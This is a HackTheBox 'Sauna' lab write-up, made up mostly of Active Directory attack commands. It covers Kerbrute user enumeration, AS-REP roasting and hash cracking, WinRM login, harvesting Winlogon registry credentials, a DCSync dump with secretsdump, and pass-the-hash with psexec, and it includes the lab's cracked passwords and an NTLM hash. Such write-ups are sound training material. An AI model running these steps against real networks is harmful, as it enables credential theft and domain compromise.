# HackTheBox - Sauna
**Youtube video:** https://youtu.be/Tb4-Tj-zlI0
---
## Initial Foothold

**Username Enumeration:**
```bash
# About us page has usernames

# Method 1: Username Anarchy (lfirst format)
# Extended version: https://github.com/strikoder/username-anarchy-extended

# Method 2: Kerbrute with common usernames
kerbrute userenum -d "$domain" --dc "$IP" -v /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt | grep '\[+\] VALID USERNAME'
```

**AS-REP Roasting:**
```bash
# Attempt AS-REP roasting (no pre-auth required)
impacket-GetNPUsers $domain/ -dc-ip $IP -usersfile valid_ad_users -no-pass
# Note: Use -k if above doesn't work, or remove -no-pass (depends on version)

# Crack AS-REP hashes
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**WinRM Access:**
```bash
# Connect via Evil-WinRM
evil-winrm -i $IP -d $domain -u $user -p 'Thestrokes23'
```

---
## Privilege Escalation

**Enumeration with WinPEAS:**
```powershell
# Upload and run WinPEAS
winpeas
```

**Registry Credential Discovery:**
```powershell
# Check Winlogon registry for stored credentials
Get-Item -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Found credentials:
# svc_loanmgr:Moneymakestheworldgoround!
```

**BloodHound Enumeration:**
```bash
# Run RustHound for AD enumeration
rusthound-ce -d $domain -u $user@$domain -p $pass -z

# Analysis shows: svc_loanmgr has DCSync rights over the DC
```

**DCSync Attack:**
```bash
# Dump domain secrets using DCSync
secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@$IP
```

**Administrator Access:**
```bash
# Use administrator NTLM hash for pass-the-hash
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e administrator@$IP cmd.exe
```
